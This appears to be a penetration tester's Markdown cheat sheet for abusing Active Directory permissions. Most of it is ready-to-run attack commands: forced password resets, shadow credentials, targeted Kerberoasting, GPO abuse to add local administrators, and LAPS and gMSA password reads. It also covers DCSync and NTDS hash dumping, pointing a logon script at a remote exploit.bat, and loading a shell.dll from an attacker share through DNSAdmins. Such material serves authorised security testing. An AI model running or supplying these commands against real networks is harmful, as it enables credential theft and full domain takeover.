# ACL Abuse

![Alt text](/Images/image-12.png)

## ForceChangePassword on User

```bash
net rpc password targetUser -U domain.com/username%password -S dc.domain.com #Insert passwor
# rpcclient
rpcclient -U domain.com/user dcIP
rpcclient $> setuserinfo2 targetUser 23 newPassUser
# Computer -> User
pth-net rpc password "targetUser" "newPassword" -U "domain.com"/'COMPUTER1$'%"NT":"LM" -S "dcIP"
```

## GenericWrite on User

This could be abuse with 3 different technics:

1. shadowCredentials (windows server 2016 or +)
2. [targetKerberoasting](https://github.com/ShutdownRepo/targetedKerberoast) (password should be weak enough to be cracked)
3. [logonScript](https://github.com/franc-pentest/ldeep) (this need a user connection and to be honest it never worked or unless with a script already inside sysvol)

```bash
# Shadow Credentials addKeyCredentialLink
certipy shadow auto -u username@domain.com -p 'password' -account 'targetUsername' # COMPUTER1$
# kerberoasting
python3 targetedKerberoast.py -v -d domain.com -u username -p password --request-user targetUsername
ldeep ldap -u username -p 'password' -d domain.com -s ldap://dcIP search '(sAMAccountName=targetUsername)' scriptpath
```

```python
import ldap3
dn = "CN=targetUsername,OU=OUUSER,DC=domain,DC=com"
user = "domain.com\\username"
password = "password"
server = ldap3.Server('dc.domain.com')
ldap_con = ldap3.Connection(server = server, user = user, password = password, authentication = ldap3.NTLM)
ldap_con.bind()
ldap_con.modify(dn,{'scriptpath' : [(ldap3.MODIFY_REPLACE, '\\\\ip\share\exploit.bat')]})
print(ldap_con.result)
ldap_con.unbind()
```

## WriteDacl on User

```bash
dacledit.py -action 'read' -principal username -target 'targetUsername' 'domain.com'/'username':'password'
dacledit.py -action 'write' -rights 'FullControl' -principal username -target 'targetUsername' 'domain.com'/'username':'password'
## Now you can abuse GenericWrite 
```

## Add self on Group

```bash
ldeep ldap -u username -p password -d domain.com -s ldap://ipDC search '(sAMAccountName=username)' distinguishedName
ldeep ldap -u username -p password -d domain.com -s ldap://ipDC search '(sAMAccountName=group name)' distinguishedName
ldeep ldap -u username -p password -d domain.com -s ldap://ipDC add_to_group "previos output <CN= DC=, DC="
ldeep ldap -u username -p password -d domain.com -s ldap://ipDC membersof 'group name'
```

## Add Member on Group

```bash
net rpc group addmem targetGroup targetUser -U domain.com/username%Pass -S dcIP
net rpc group addmem targetGroup targetUser -U domain.com/username -S dcIP #Password prompted
```

## WriteOwner on Group 

> As owner of the group we can now change the acl and give us GenericAll on the group

```bash
owneredit.py -action read -target 'targetGroup' domain.com/username:pass
owneredit.py -action write -owner 'username' -target 'targetGroup' domain.com/username:pass
```

## Generic All

![Alt text](/Images/image-13.png)


### GenericAll on User

```bash
net rpc password targetUser -U domain.com/username%password -S dc.domain.com #Insert passwor
# rpcclient
rpcclient -U domain.com/user dcIP
rpcclient $> setuserinfo2 targetUser 23 newPassUser
```

### GenericAll on Computer

```bash
certipy shadow auto -u username@domain.com -p 'password' -account 'computer$'
```

## GPO Abuse

> pyGPOAbuse is changing the GPO without going back ! `Do not use in production` or at your own risk and do not forget to cleanup after

```bash
# GPOwned (buggy, not to use in production) - execute something (e.g. calc.exe)
GPOwned -u 'user' -p 'password' -d 'domain' -dc-ip 'domaincontroller' -gpoimmtask -name '{12345677-ABCD-9876-ABCD-123456789012}' -author 'DOMAIN\Administrator' -taskname 'Some name' -taskdescription 'Some description' -dstpath 'c:\windows\system32\calc.exe'

# pyGPOabuse, update an existing GPO - add a local admin
pygpoabuse 'domain'/'user':'password' -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
```

## Read LAPS Password

```bash
pyLAPS.py --action get -d 'DOMAIN' -u 'USER' -p 'PASSWORD' --dc-ip dcIP
crackmapexec ldap dcIP -d domain.com -u user -p password -M laps
```

## Read GMSA Password

```bash
gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
```

## DCSync

```bash
crackmapexec smb ip -u user -p pass --ntds
secretsdump.py domian.com/user:'Pass'@dc.domain.com
```

## Allowed to delegate

> Check ADExploitation.md - Constrained Delegation


## DNS Admins

```bash
# VIctim
dnscmd dc1 /config /serverlevelplugindll \\attackerIP\share\shell.dll
# Check
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
# Restart Service
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

## Resetting password

### User

> STATUS_PASSWORD_MUST_CHANGE

1. Outlook web app
2. RDP
3. smbpasswd (easy)
4. ldap

```bash
impacket-smbpasswd domain.com/user:pass@dc.domain.com -newpass NewPass2024
```

### Computer

1. The NetUserChangePassword protocol
2. The NetUserSetInfo protocol
3. The Kerberos change-password protocol (IETF Internet Draft Draft-ietf-cat-kerb-chg-password-02.txt) - port 464
4. Kerberos set-password protocol (IETF Internet Draft Draft-ietf-cat-kerberos-set-passwd-00.txt) - port 464
5. Lightweight Directory Access Protocol (LDAP) write-password attribute (if 128-bit Secure Sockets Layer (SSL) is used)
6. XACT-SMB for pre-Microsoft Windows NT (LAN Manager) compatibility

```bash
changepasswd.py domain.com/'computer01$':'pass'@domain.com -newpass password -protocol kpasswd -dc-ip <DC IP>
```

## Privileged Groups

### Backup Operators

```powershell
# Obtener SAM SECURITY y SYSTEM files
.\BackupOperatorToDA.exe -u 'user' -p 'pass' -d domain.com -t \\dc01.domain.com -o C:\
# Descifrar y obtener hashes NTLM
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
# Guardamos el hash de $MACHINE.ACC y hacemos Dump de NTDS
netexec smb 10.10.121.167 -u 'dc01$' -H <hash here> --ntds
```


### References

- https://bloodhound.readthedocs.io/_/downloads/en/latest/pdf/
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse
- https://www.thehacker.recipes/a-d/recon
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
- https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/